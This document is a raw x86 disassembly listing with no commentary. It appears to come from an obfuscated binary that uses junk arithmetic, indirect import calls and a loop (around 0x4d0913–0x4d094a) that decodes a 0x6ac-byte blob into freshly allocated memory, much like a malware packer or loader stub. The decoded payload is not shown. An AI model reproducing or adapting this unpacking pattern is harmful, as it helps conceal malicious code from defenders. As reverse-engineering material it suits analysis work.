  4d0772:	mov    edx,0x0
  4d0777:	push   edx
  4d0778:	call   0x4d0f70
  4d077d:	add    esp,0x4
  4d0780:	pop    edx
  4d0781:	push   edx
  4d0782:	push   DWORD PTR [edx+0x140]
  4d0788:	push   eax
  4d0789:	push   esi
  4d078a:	call   0x4d0864
  4d078f:	add    esp,0xc
  4d0792:	pop    edx
  4d0793:	mov    esi,0x4d2004
  4d0798:	mov    esi,DWORD PTR [esi]
  4d079a:	push   esi
  4d079b:	push   DWORD PTR [edx-0x130]
  4d07a1:	pop    esi
  4d07a2:	call   esi
  4d07a4:	add    esp,0x5c
  4d07a7:	pop    ebp
  4d07a8:	ret    
  4d07a9:	add    BYTE PTR [eax],al
  4d07ab:	add    BYTE PTR [edi-0x1],bl
  4d07ae:	adc    eax,0x4d2004
  4d07b3:	call   edi
  4d07b5:	add    BYTE PTR [eax],al
  4d07b7:	add    BYTE PTR [edi-0x1],bl
  4d07ba:	adc    eax,0x4d20a0
  4d07bf:	call   edi
  4d07c1:	add    BYTE PTR [eax],al
  4d07c3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07c9:	sub    esp,0x38
  4d07cc:	lea    edx,ds:0x4d3020
  4d07d2:	sbb    eax,0x2a5f
  4d07d7:	push   edx
  4d07d8:	call   0x4d0f94
  4d07dd:	add    esp,0x4
  4d07e0:	pop    edx
  4d07e1:	push   edx
  4d07e2:	push   ecx
  4d07e3:	push   DWORD PTR [edx+0x1b0]
  4d07e9:	call   0x4d0ffc
  4d07ee:	add    esp,0x8
  4d07f1:	pop    edx
  4d07f2:	push   edx
  4d07f3:	mov    ebx,0x0
  4d07f8:	push   ebx
  4d07f9:	call   0x4d0d88
  4d07fe:	add    esp,0x4
  4d0801:	pop    edx
  4d0802:	add    esp,0x38
  4d0805:	pop    ebp
  4d0806:	ret    
  4d0807:	add    BYTE PTR [edi-0x1],bl
  4d080a:	adc    eax,0x4d2088
  4d080f:	call   edi
  4d0811:	add    BYTE PTR [eax],al
  4d0813:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0819:	sub    esp,0x40
  4d081c:	lea    edi,ds:0x4d31a4
  4d0822:	xor    DWORD PTR [edi+0x20],0xc
  4d0826:	push   edi
  4d0827:	mov    esi,0x0
  4d082c:	push   esi
  4d082d:	call   0x4d1088
  4d0832:	add    esp,0x4
  4d0835:	pop    edi
  4d0836:	push   edi
  4d0837:	push   DWORD PTR [edi+0x15c]
  4d083d:	push   DWORD PTR [edi+0xf4]
  4d0843:	call   0x4d0b2c
  4d0848:	add    esp,0x8
  4d084b:	pop    edi
  4d084c:	push   edi
  4d084d:	mov    ecx,0x0
  4d0852:	push   ecx
  4d0853:	call   0x4d0f7c
  4d0858:	add    esp,0x4
  4d085b:	pop    edi
  4d085c:	add    esp,0x40
  4d085f:	pop    ebp
  4d0860:	ret    
  4d0861:	add    BYTE PTR [eax],al
  4d0863:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0869:	sub    esp,0x5c
  4d086c:	lea    ebx,ds:0x4d30ac
  4d0872:	and    DWORD PTR [ebx+0x150],esi
  4d0878:	push   ebx
  4d0879:	push   DWORD PTR [ebx+0x180]
  4d087f:	push   esi
  4d0880:	push   edx
  4d0881:	push   DWORD PTR [ebx+0x1e8]
  4d0887:	call   0x4d0dac
  4d088c:	add    esp,0x10
  4d088f:	pop    ebx
  4d0890:	mov    edx,0x0
  4d0895:	push   edx
  4d0896:	call   0x4d0cc8
  4d089b:	add    esp,0x4
  4d089e:	mov    edx,0x0
  4d08a3:	push   edx
  4d08a4:	call   0x4d156c
  4d08a9:	add    esp,0x4
  4d08ac:	add    esp,0x5c
  4d08af:	pop    ebp
  4d08b0:	ret    
  4d08b1:	add    BYTE PTR [eax],al
  4d08b3:	add    BYTE PTR [edi-0x1],bl
  4d08b6:	adc    eax,0x4d2030
  4d08bb:	call   edi
  4d08bd:	add    BYTE PTR [eax],al
  4d08bf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08c5:	sub    esp,0x3c
  4d08c8:	cmp    edx,0x3460
  4d08ce:	jb     0x4d08c3
  4d08d0:	lea    eax,ds:0x4d31ac
  4d08d6:	push   eax
  4d08d7:	push   0x6ac
  4d08dc:	push   0x6ac
  4d08e1:	push   0x40001
  4d08e6:	mov    edx,0x8629859a
  4d08eb:	push   DWORD PTR [edx+0x7a239a86]
  4d08f1:	sub    DWORD PTR [esp],0x2
  4d08f5:	mov    edx,0x4d203c
  4d08fa:	pop    DWORD PTR [edx]
  4d08fc:	call   0x4d09ec
  4d0901:	add    esp,0x4
  4d0904:	xchg   DWORD PTR [esp],eax
  4d0907:	pop    DWORD PTR [eax-0xf8]
  4d090d:	mov    ebx,DWORD PTR [eax-0xf8]
  4d0913:	lea    esi,[ebx]
  4d0915:	sub    ebx,ebx
  4d0917:	dec    ebx
  4d0918:	and    ebx,0x4d0014
  4d091e:	mov    edx,0x8d9ae218
  4d0923:	xor    edi,edi
  4d0925:	add    edi,0x6ac
  4d092b:	cmp    edi,0x0
  4d092e:	je     0x4d094c
  4d0930:	add    edi,0xfffffffc
  4d0933:	xor    ecx,ecx
  4d0935:	push   DWORD PTR [ebx+ecx*1]
  4d0938:	add    DWORD PTR [esp],edx
  4d093b:	pop    DWORD PTR [esi+ecx*2]
  4d093e:	dec    DWORD PTR [esi]
  4d0940:	xor    edx,edx
  4d0942:	add    edx,DWORD PTR [ebx]
  4d0944:	add    ebx,0x4
  4d0947:	add    esi,0x4
  4d094a:	jmp    0x4d092b
  4d094c:	push   eax
  4d094d:	mov    ebx,0x0
  4d0952:	push   ebx
  4d0953:	call   0x4d1088
  4d0958:	add    esp,0x4
  4d095b:	pop    eax
  4d095c:	add    esp,0x3c
  4d095f:	pop    ebp
  4d0960:	ret    
  4d0961:	add    BYTE PTR [eax],al
  4d0963:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0969:	sub    esp,0x60
  4d096c:	mov    eax,0x4d31f0
  4d0971:	and    edx,eax
  4d0973:	push   eax
  4d0974:	mov    ecx,0x0
  4d0979:	push   ecx
  4d097a:	call   0x4d0cc8
  4d097f:	add    esp,0x4
  4d0982:	pop    eax
  4d0983:	push   eax
  4d0984:	push   edx
  4d0985:	push   DWORD PTR [eax+0x78]
  4d0988:	call   0x4d07c4
  4d098d:	add    esp,0x8
  4d0990:	pop    eax
  4d0991:	push   eax
  4d0992:	lea    eax,[eax-0x1f0]
  4d0998:	push   eax
  4d0999:	call   0x4d07ac
  4d099e:	add    esp,0x4
  4d09a1:	test   eax,eax
  4d09a3:	jne    0x4d0992
  4d09a5:	pop    eax
  4d09a6:	add    esp,0x60
  4d09a9:	pop    ebp
  4d09aa:	ret    
  4d09ab:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09b1:	sub    esp,0x60
  4d09b4:	lea    ebx,ds:0x4d30b4
  4d09ba:	mov    DWORD PTR [ebp-0x54],0x70
  4d09c1:	push   ebx
  4d09c2:	push   eax
  4d09c3:	push   edx
  4d09c4:	call   0x4d1578
  4d09c9:	add    esp,0x8
  4d09cc:	pop    ebx
  4d09cd:	mov    ecx,0x0
  4d09d2:	push   ecx
  4d09d3:	call   0x4d0d88
  4d09d8:	add    esp,0x4
  4d09db:	push   0x0
  4d09dd:	call   0x4d0744
  4d09e2:	add    esp,0x4
  4d09e5:	add    esp,0x60
  4d09e8:	pop    ebp
  4d09e9:	ret    
  4d09ea:	add    BYTE PTR [eax],al
  4d09ec:	pop    edi
  4d09ed:	call   DWORD PTR ds:0x4d203c
  4d09f3:	call   edi
  4d09f5:	add    BYTE PTR [eax],al
  4d09f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09fd:	sub    esp,0x40
  4d0a00:	mov    eax,0x4d308c
  4d0a05:	mov    ebx,edi
  4d0a07:	push   eax
  4d0a08:	mov    ecx,0x0
  4d0a0d:	push   ecx
  4d0a0e:	call   0x4d1214
  4d0a13:	add    esp,0x4
  4d0a16:	pop    eax
  4d0a17:	push   eax
  4d0a18:	push   DWORD PTR [eax+0x190]
  4d0a1e:	push   DWORD PTR [eax+0x168]
  4d0a24:	call   0x4d10e8
  4d0a29:	add    esp,0x8
  4d0a2c:	pop    eax
  4d0a2d:	push   eax
  4d0a2e:	call   0x4d0e8c
  4d0a33:	add    esp,0x4
  4d0a36:	pop    eax
  4d0a37:	add    esp,0x40
  4d0a3a:	pop    ebp
  4d0a3b:	ret    
  4d0a3c:	mov    edi,edi
  4d0a3e:	push   ebp
  4d0a3f:	mov    ebp,esp
  4d0a41:	sub    esp,0x3c
  4d0a44:	lea    esi,[eax+0x7c]
  4d0a47:	adc    ebx,DWORD PTR [esi-0x1b4]
  4d0a4d:	push   esi
  4d0a4e:	push   edi
  4d0a4f:	push   ecx
  4d0a50:	push   DWORD PTR [esi+0x8]
  4d0a53:	call   0x4d0ae4
  4d0a58:	add    esp,0xc
  4d0a5b:	pop    esi
  4d0a5c:	push   0x0
  4d0a5e:	call   0x4d0f70
  4d0a63:	add    esp,0x4
  4d0a66:	mov    ecx,0x0
  4d0a6b:	push   ecx
  4d0a6c:	call   0x4d0f70
  4d0a71:	add    esp,0x4
  4d0a74:	add    esp,0x3c
  4d0a77:	pop    ebp
  4d0a78:	ret    
  4d0a79:	add    BYTE PTR [eax],al
  4d0a7b:	add    BYTE PTR [edi-0x1],bl
  4d0a7e:	adc    eax,0x4d2074
  4d0a83:	call   edi
  4d0a85:	add    BYTE PTR [eax],al
  4d0a87:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a8d:	sub    esp,0x34
  4d0a90:	mov    eax,0x4d3074
  4d0a95:	add    DWORD PTR [eax+0x11c],ecx
  4d0a9b:	push   eax
  4d0a9c:	mov    esi,0x0
  4d0aa1:	push   esi
  4d0aa2:	call   0x4d0744
  4d0aa7:	add    esp,0x4
  4d0aaa:	pop    eax
  4d0aab:	push   eax
  4d0aac:	push   ecx
  4d0aad:	push   DWORD PTR [eax+0x10]
  4d0ab0:	push   DWORD PTR [eax+0x48]
  4d0ab3:	call   0x4d0ed8
  4d0ab8:	add    esp,0xc
  4d0abb:	pop    eax
  4d0abc:	push   eax
  4d0abd:	call   0x4d0f94
  4d0ac2:	add    esp,0x4
  4d0ac5:	pop    eax
  4d0ac6:	add    esp,0x34
  4d0ac9:	pop    ebp
  4d0aca:	ret    
  4d0acb:	add    BYTE PTR [edi-0x1],bl
  4d0ace:	adc    eax,0x4d2060
  4d0ad3:	call   edi
  4d0ad5:	add    BYTE PTR [eax],al
  4d0ad7:	add    BYTE PTR [edi-0x1],bl
  4d0ada:	adc    eax,0x4d206c
  4d0adf:	call   edi
  4d0ae1:	add    BYTE PTR [eax],al
  4d0ae3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ae9:	sub    esp,0x3c
  4d0aec:	lea    ecx,[esi-0x160]
  4d0af2:	adc    DWORD PTR [ebp-0x28],eax
  4d0af5:	push   ecx
  4d0af6:	mov    eax,0x0
  4d0afb:	push   eax
  4d0afc:	call   0x4d0f70
  4d0b01:	add    esp,0x4
  4d0b04:	pop    ecx
  4d0b05:	push   ecx
  4d0b06:	push   eax
  4d0b07:	push   DWORD PTR [ecx+0x1ec]
  4d0b0d:	push   eax
  4d0b0e:	call   0x4d1044
  4d0b13:	add    esp,0xc
  4d0b16:	pop    ecx
  4d0b17:	push   ecx
  4d0b18:	mov    ecx,0x0
  4d0b1d:	push   ecx
  4d0b1e:	call   0x4d1088
  4d0b23:	add    esp,0x4
  4d0b26:	pop    ecx
  4d0b27:	add    esp,0x3c
  4d0b2a:	pop    ebp
  4d0b2b:	ret    
  4d0b2c:	mov    edi,edi
  4d0b2e:	push   ebp
  4d0b2f:	mov    ebp,esp
  4d0b31:	sub    esp,0x20
  4d0b34:	lea    ecx,ds:0x4d31fc
  4d0b3a:	sbb    DWORD PTR [ebp-0x10],0xffffffcf
  4d0b3e:	push   ecx
  4d0b3f:	mov    eax,0x0
  4d0b44:	push   eax
  4d0b45:	call   0x4d11b0
  4d0b4a:	add    esp,0x4
  4d0b4d:	pop    ecx
  4d0b4e:	push   ecx
  4d0b4f:	push   edi
  4d0b50:	push   edx
  4d0b51:	call   0x4d0cd4
  4d0b56:	add    esp,0x8
  4d0b59:	pop    ecx
  4d0b5a:	push   ecx
  4d0b5b:	push   0x0
  4d0b5d:	call   0x4d0744
  4d0b62:	add    esp,0x4
  4d0b65:	pop    ecx
  4d0b66:	add    esp,0x20
  4d0b69:	pop    ebp
  4d0b6a:	ret    
  4d0b6b:	add    BYTE PTR [edi-0x1],bl
  4d0b6e:	adc    eax,0x4d208c
  4d0b73:	call   edi
  4d0b75:	add    BYTE PTR [eax],al
  4d0b77:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b7d:	sub    esp,0x24
  4d0b80:	lea    ecx,[eax+0x18c]
  4d0b86:	cmp    ecx,0x3255
  4d0b8c:	jbe    0x4d0b7b
  4d0b8e:	push   ecx
  4d0b8f:	call   0x4d0f94
  4d0b94:	add    esp,0x4
  4d0b97:	pop    ecx
  4d0b98:	push   ecx
  4d0b99:	push   esi
  4d0b9a:	push   edx
  4d0b9b:	push   DWORD PTR [ecx+0xd8]
  4d0ba1:	push   ebx
  4d0ba2:	call   0x4d06f8
  4d0ba7:	add    esp,0x10
  4d0baa:	pop    ecx
  4d0bab:	push   ecx
  4d0bac:	lea    edx,[ecx-0x1fc]
  4d0bb2:	push   edx
  4d0bb3:	call   0x4d07ac
  4d0bb8:	add    esp,0x4
  4d0bbb:	test   eax,eax
  4d0bbd:	jne    0x4d0bac
  4d0bbf:	pop    ecx
  4d0bc0:	add    esp,0x24
  4d0bc3:	pop    ebp
  4d0bc4:	ret    
  4d0bc5:	add    BYTE PTR [eax],al
  4d0bc7:	add    BYTE PTR [edi-0x1],bl
  4d0bca:	adc    eax,0x4d2084
  4d0bcf:	call   edi
  4d0bd1:	add    BYTE PTR [eax],al
  4d0bd3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bd9:	sub    esp,0x34
  4d0bdc:	lea    ebx,[esi+0x108]
  4d0be2:	xor    DWORD PTR [ebp-0x1c],esi
  4d0be5:	push   ebx
  4d0be6:	push   DWORD PTR [ebx+0x1ac]
  4d0bec:	push   eax
  4d0bed:	call   0x4d1094
  4d0bf2:	add    esp,0x8
  4d0bf5:	pop    ebx
  4d0bf6:	push   0x0
  4d0bf8:	call   0x4d0744
  4d0bfd:	add    esp,0x4
  4d0c00:	mov    edi,0xfffffff4
  4d0c05:	push   edi
  4d0c06:	call   0x4d0ff0
  4d0c0b:	add    esp,0x4
  4d0c0e:	add    esp,0x34
  4d0c11:	pop    ebp
  4d0c12:	ret    
  4d0c13:	add    BYTE PTR [edi-0x1],bl
  4d0c16:	adc    eax,0x4d2020
  4d0c1b:	call   edi
  4d0c1d:	add    BYTE PTR [eax],al
  4d0c1f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c25:	sub    esp,0x3c
  4d0c28:	lea    ebx,ds:0x4d30d0
  4d0c2e:	add    DWORD PTR [ebx-0x68],ebx
  4d0c31:	push   ebx
  4d0c32:	push   DWORD PTR [ebx+0x1b4]
  4d0c38:	push   DWORD PTR [ebx+0x15c]
  4d0c3e:	push   DWORD PTR [ebx+0x110]
  4d0c44:	push   ecx
  4d0c45:	call   0x4d148c
  4d0c4a:	add    esp,0x10
  4d0c4d:	pop    ebx
  4d0c4e:	push   0x0
  4d0c50:	call   0x4d0d94
  4d0c55:	add    esp,0x4
  4d0c58:	push   0x0
  4d0c5a:	call   0x4d0f70
  4d0c5f:	add    esp,0x4
  4d0c62:	add    esp,0x3c
  4d0c65:	pop    ebp
  4d0c66:	ret    
  4d0c67:	add    BYTE PTR [edi+0x2b],dl
  4d0c6a:	call   DWORD PTR [edi+0x57]
  4d0c6d:	push   edi
  4d0c6e:	push   edi
  4d0c6f:	call   0x4d0e8c
  4d0c74:	sub    esp,0xfffffffc
  4d0c77:	call   0x4d1350
  4d0c7c:	push   0x2
  4d0c7e:	xor    eax,eax
  4d0c80:	sub    eax,0x4d3030
  4d0c85:	neg    eax
  4d0c87:	push   0x0
  4d0c89:	lea    ecx,[eax+0x4]
  4d0c8c:	add    BYTE PTR [ecx],0x3
  4d0c8f:	push   eax
  4d0c90:	call   0x4d09ec
  4d0c95:	pop    edi
  4d0c96:	pop    edi
  4d0c97:	pop    edi
  4d0c98:	lea    ecx,[eax+0x3b]
  4d0c9b:	mov    edi,DWORD PTR [ecx]
  4d0c9d:	lea    eax,[eax+edi*1]
  4d0ca0:	mov    eax,DWORD PTR [eax+0x28]
  4d0ca3:	pusha  
  4d0ca4:	mov    ah,0x45
  4d0ca6:	sub    al,ah
  4d0ca8:	ja     0x4d075c
  4d0cae:	popa   
  4d0caf:	ret    
  4d0cb0:	pop    edi
  4d0cb1:	call   DWORD PTR ds:0x4d2014
  4d0cb7:	call   edi
  4d0cb9:	add    BYTE PTR [eax],al
  4d0cbb:	add    BYTE PTR [edi-0x1],bl
  4d0cbe:	adc    eax,0x4d2058
  4d0cc3:	call   edi
  4d0cc5:	add    BYTE PTR [eax],al
  4d0cc7:	add    BYTE PTR [edi-0x1],bl
  4d0cca:	adc    eax,0x4d2000
  4d0ccf:	call   edi
  4d0cd1:	add    BYTE PTR [eax],al
  4d0cd3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0cd9:	sub    esp,0x40
  4d0cdc:	mov    esi,0x4d3064
  4d0ce1:	adc    DWORD PTR [esi-0x30],0xffffff97
  4d0ce5:	push   esi
  4d0ce6:	push   edi
  4d0ce7:	push   eax
  4d0ce8:	call   0x4d1264
  4d0ced:	add    esp,0x8
  4d0cf0:	pop    esi
  4d0cf1:	push   0x0
  4d0cf3:	call   0x4d1214
  4d0cf8:	add    esp,0x4
  4d0cfb:	push   0x0
  4d0cfd:	call   0x4d0d88
  4d0d02:	add    esp,0x4
  4d0d05:	add    esp,0x40
  4d0d08:	pop    ebp
  4d0d09:	ret    
  4d0d0a:	add    BYTE PTR [eax],al
  4d0d0c:	mov    edi,edi
  4d0d0e:	push   ebp
  4d0d0f:	mov    ebp,esp
  4d0d11:	sub    esp,0x20
  4d0d14:	lea    edi,[ebx+0xe4]
  4d0d1a:	or     DWORD PTR [ebp-0x20],0x6c
  4d0d1e:	push   edi
  4d0d1f:	push   0x0
  4d0d21:	call   0x4d0cc8
  4d0d26:	add    esp,0x4
  4d0d29:	pop    edi
  4d0d2a:	push   edi
  4d0d2b:	push   esi
  4d0d2c:	push   ecx
  4d0d2d:	push   edx
  4d0d2e:	call   0x4d11c8
  4d0d33:	add    esp,0xc
  4d0d36:	pop    edi
  4d0d37:	push   edi
  4d0d38:	call   0x4d0e8c
  4d0d3d:	add    esp,0x4
  4d0d40:	pop    edi
  4d0d41:	add    esp,0x20
  4d0d44:	pop    ebp
  4d0d45:	ret    
  4d0d46:	add    BYTE PTR [eax],al
  4d0d48:	mov    edi,edi
  4d0d4a:	push   ebp
  4d0d4b:	mov    ebp,esp
  4d0d4d:	sub    esp,0x4c
  4d0d50:	lea    esi,[eax-0x3c]
  4d0d53:	sub    DWORD PTR [ebp-0x24],0x4a76
  4d0d5a:	push   esi
  4d0d5b:	push   DWORD PTR [esi+0x144]
  4d0d61:	push   DWORD PTR [esi+0x54]
  4d0d64:	push   eax
  4d0d65:	push   edx
  4d0d66:	call   0x4d0814
  4d0d6b:	add    esp,0x10
  4d0d6e:	pop    esi
  4d0d6f:	push   0x0
  4d0d71:	call   0x4d0d88
  4d0d76:	add    esp,0x4
  4d0d79:	call   0x4d0f94
  4d0d7e:	add    esp,0x4
  4d0d81:	add    esp,0x4c
  4d0d84:	pop    ebp
  4d0d85:	ret    
  4d0d86:	add    BYTE PTR [eax],al
  4d0d88:	pop    edi
  4d0d89:	call   DWORD PTR ds:0x4d200c
  4d0d8f:	call   edi
  4d0d91:	add    BYTE PTR [eax],al
  4d0d93:	add    BYTE PTR [edi-0x1],bl
  4d0d96:	adc    eax,0x4d2040
  4d0d9b:	call   edi
  4d0d9d:	add    BYTE PTR [eax],al
  4d0d9f:	add    BYTE PTR [edi-0x1],bl
  4d0da2:	adc    eax,0x4d2068
  4d0da7:	call   edi
  4d0da9:	add    BYTE PTR [eax],al
  4d0dab:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0db1:	sub    esp,0x38
  4d0db4:	lea    edx,[ebx+0x70]
  4d0db7:	add    DWORD PTR [ebp-0x8],0x17
  4d0dbb:	push   edx
  4d0dbc:	mov    ebx,0x0
  4d0dc1:	push   ebx
  4d0dc2:	call   0x4d0f70
  4d0dc7:	add    esp,0x4
  4d0dca:	pop    edx
  4d0dcb:	push   edx
  4d0dcc:	push   DWORD PTR [edx+0x90]
  4d0dd2:	push   eax
  4d0dd3:	push   DWORD PTR [edx+0xe4]
  4d0dd9:	call   0x4d09ac
  4d0dde:	add    esp,0xc
  4d0de1:	pop    edx
  4d0de2:	push   edx
  4d0de3:	mov    edx,0x0
  4d0de8:	push   edx
  4d0de9:	call   0x4d11b0
  4d0dee:	add    esp,0x4
  4d0df1:	pop    edx
  4d0df2:	add    esp,0x38
  4d0df5:	pop    ebp
  4d0df6:	ret    
  4d0df7:	add    BYTE PTR [edi-0x1],bl
  4d0dfa:	adc    eax,0x4d2048
  4d0dff:	call   edi
  4d0e01:	add    BYTE PTR [eax],al
  4d0e03:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e09:	sub    esp,0x20
  4d0e0c:	lea    eax,[ecx+0x110]
  4d0e12:	mov    ebx,0xffffff90
  4d0e17:	push   eax
  4d0e18:	push   DWORD PTR [eax+0x78]
  4d0e1b:	push   DWORD PTR [eax+0x124]
  4d0e21:	call   0x4d0f2c
  4d0e26:	add    esp,0x8
  4d0e29:	pop    eax
  4d0e2a:	push   eax
  4d0e2b:	mov    ecx,0x0
  4d0e30:	push   ecx
  4d0e31:	call   0x4d0f70
  4d0e36:	add    esp,0x4
  4d0e39:	pop    eax
  4d0e3a:	push   eax
  4d0e3b:	call   0x4d08b4
  4d0e40:	add    esp,0x4
  4d0e43:	pop    eax
  4d0e44:	add    esp,0x20
  4d0e47:	pop    ebp
  4d0e48:	ret    
  4d0e49:	add    BYTE PTR [eax],al
  4d0e4b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e51:	sub    esp,0x20
  4d0e54:	lea    esi,ds:0x4d30e0
  4d0e5a:	adc    ecx,DWORD PTR [esi-0x60]
  4d0e5d:	push   esi
  4d0e5e:	push   DWORD PTR [esi+0xe4]
  4d0e64:	push   ecx
  4d0e65:	push   eax
  4d0e66:	push   ecx
  4d0e67:	call   0x4d0e98
  4d0e6c:	add    esp,0x10
  4d0e6f:	pop    esi
  4d0e70:	call   0x4d0e8c
  4d0e75:	add    esp,0x4
  4d0e78:	mov    ebx,0x0
  4d0e7d:	push   ebx
  4d0e7e:	call   0x4d1088
  4d0e83:	add    esp,0x4
  4d0e86:	add    esp,0x20
  4d0e89:	pop    ebp
  4d0e8a:	ret    
  4d0e8b:	add    BYTE PTR [edi-0x1],bl
  4d0e8e:	adc    eax,0x4d2018
  4d0e93:	call   edi
  4d0e95:	add    BYTE PTR [eax],al
  4d0e97:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e9d:	sub    esp,0x4c
  4d0ea0:	mov    eax,0x4d3180
  4d0ea5:	mov    DWORD PTR [eax+0x44],eax
  4d0ea8:	push   eax
  4d0ea9:	push   ecx
  4d0eaa:	push   ebx
  4d0eab:	push   esi
  4d0eac:	push   esi
  4d0ead:	call   0x4d0d48
  4d0eb2:	add    esp,0x10
  4d0eb5:	pop    eax
  4d0eb6:	push   eax
  4d0eb7:	push   0xfffffff4
  4d0eb9:	call   0x4d0ff0
  4d0ebe:	add    esp,0x4
  4d0ec1:	pop    eax
  4d0ec2:	push   eax
  4d0ec3:	mov    ebx,0x0
  4d0ec8:	push   ebx
  4d0ec9:	call   0x4d156c
  4d0ece:	add    esp,0x4
  4d0ed1:	pop    eax
  4d0ed2:	add    esp,0x4c
  4d0ed5:	pop    ebp
  4d0ed6:	ret    
  4d0ed7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0edd:	sub    esp,0x50
  4d0ee0:	lea    edx,ds:0x4d3054
  4d0ee6:	cmp    edx,0x1e9b
  4d0eec:	jbe    0x4d0edb
  4d0eee:	push   edx
  4d0eef:	push   DWORD PTR [edx+0x198]
  4d0ef5:	push   DWORD PTR [edx+0x10c]
  4d0efb:	call   0x4d08c0
  4d0f00:	add    esp,0x8
  4d0f03:	pop    edx
  4d0f04:	push   edx
  4d0f05:	mov    edi,0x0
  4d0f0a:	push   edi
  4d0f0b:	call   0x4d156c
  4d0f10:	add    esp,0x4
  4d0f13:	pop    edx
  4d0f14:	push   edx
  4d0f15:	mov    esi,0x0
  4d0f1a:	push   esi
  4d0f1b:	call   0x4d1214
  4d0f20:	add    esp,0x4
  4d0f23:	pop    edx
  4d0f24:	add    esp,0x50
  4d0f27:	pop    ebp
  4d0f28:	ret    
  4d0f29:	add    BYTE PTR [eax],al
  4d0f2b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f31:	sub    esp,0x44
  4d0f34:	mov    edi,0x4d30ac
  4d0f39:	xor    ecx,DWORD PTR [ebp-0x24]
  4d0f3c:	push   edi
  4d0f3d:	push   ecx
  4d0f3e:	push   ebx
  4d0f3f:	push   DWORD PTR [edi+0xa8]
  4d0f45:	call   0x4d1220
  4d0f4a:	add    esp,0xc
  4d0f4d:	pop    edi
  4d0f4e:	push   edi
  4d0f4f:	push   0x0
  4d0f51:	call   0x4d156c
  4d0f56:	add    esp,0x4
  4d0f59:	pop    edi
  4d0f5a:	push   edi
  4d0f5b:	mov    ecx,0x0
  4d0f60:	push   ecx
  4d0f61:	call   0x4d1088
  4d0f66:	add    esp,0x4
  4d0f69:	pop    edi
  4d0f6a:	add    esp,0x44
  4d0f6d:	pop    ebp
  4d0f6e:	ret    
  4d0f6f:	add    BYTE PTR [edi-0x1],bl
  4d0f72:	adc    eax,0x4d2054
  4d0f77:	call   edi
  4d0f79:	add    BYTE PTR [eax],al
  4d0f7b:	add    BYTE PTR [edi-0x1],bl
  4d0f7e:	adc    eax,0x4d2028
  4d0f83:	call   edi
  4d0f85:	add    BYTE PTR [eax],al
  4d0f87:	add    BYTE PTR [edi-0x1],bl
  4d0f8a:	adc    eax,0x4d2090
  4d0f8f:	call   edi
  4d0f91:	add    BYTE PTR [eax],al
  4d0f93:	add    BYTE PTR [edi-0x1],bl
  4d0f96:	adc    eax,0x4d201c
  4d0f9b:	call   edi
  4d0f9d:	add    BYTE PTR [eax],al
  4d0f9f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fa5:	sub    esp,0x1c
  4d0fa8:	mov    ecx,0x4d3004
  4d0fad:	sub    DWORD PTR [ecx+0x1d8],eax
  4d0fb3:	push   ecx
  4d0fb4:	mov    edi,0x0
  4d0fb9:	push   edi
  4d0fba:	call   0x4d0d88
  4d0fbf:	add    esp,0x4
  4d0fc2:	pop    ecx
  4d0fc3:	push   ecx
  4d0fc4:	push   DWORD PTR [ecx+0x20]
  4d0fc7:	push   ebx
  4d0fc8:	push   eax
  4d0fc9:	push   edx
  4d0fca:	call   0x4d1374
  4d0fcf:	add    esp,0x10
  4d0fd2:	pop    ecx
  4d0fd3:	push   ecx
  4d0fd4:	call   0x4d0e8c
  4d0fd9:	add    esp,0x4
  4d0fdc:	pop    ecx
  4d0fdd:	add    esp,0x1c
  4d0fe0:	pop    ebp
  4d0fe1:	ret    
  4d0fe2:	add    BYTE PTR [eax],al
  4d0fe4:	pop    edi
  4d0fe5:	call   DWORD PTR ds:0x4d2024
  4d0feb:	call   edi
  4d0fed:	add    BYTE PTR [eax],al
  4d0fef:	add    BYTE PTR [edi-0x1],bl
  4d0ff2:	adc    eax,0x4d204c
  4d0ff7:	call   edi
  4d0ff9:	add    BYTE PTR [eax],al
  4d0ffb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1001:	sub    esp,0x44
  4d1004:	mov    esi,0x4d30b4
  4d1009:	and    eax,DWORD PTR [ebp-0x30]
  4d100c:	mov    edx,0x0
  4d1011:	push   edx
  4d1012:	call   0x4d0cc8
  4d1017:	add    esp,0x4
  4d101a:	push   esi
  4d101b:	push   DWORD PTR [esi+0xc8]
  4d1021:	push   edi
  4d1022:	push   DWORD PTR [esi+0x9c]
  4d1028:	call   0x4d0bd4
  4d102d:	add    esp,0xc
  4d1030:	pop    esi
  4d1031:	mov    edi,0x0
  4d1036:	push   edi
  4d1037:	call   0x4d11b0
  4d103c:	add    esp,0x4
  4d103f:	add    esp,0x44
  4d1042:	pop    ebp
  4d1043:	ret    
  4d1044:	mov    edi,edi
  4d1046:	push   ebp
  4d1047:	mov    ebp,esp
  4d1049:	sub    esp,0x34
  4d104c:	mov    eax,0x4d3070
  4d1051:	sub    edx,DWORD PTR [eax-0x14]
  4d1054:	push   eax
  4d1055:	push   0x0
  4d1057:	call   0x4d0f7c
  4d105c:	add    esp,0x4
  4d105f:	pop    eax
  4d1060:	push   eax
  4d1061:	push   edx
  4d1062:	push   ecx
  4d1063:	push   edi
  4d1064:	push   DWORD PTR [eax+0xf0]
  4d106a:	call   0x4d0b78
  4d106f:	add    esp,0x10
  4d1072:	pop    eax
  4d1073:	push   eax
  4d1074:	mov    esi,0x0
  4d1079:	push   esi
  4d107a:	call   0x4d1088
  4d107f:	add    esp,0x4
  4d1082:	pop    eax
  4d1083:	add    esp,0x34
  4d1086:	pop    ebp
  4d1087:	ret    
  4d1088:	pop    edi
  4d1089:	call   DWORD PTR ds:0x4d2080
  4d108f:	call   edi
  4d1091:	add    BYTE PTR [eax],al
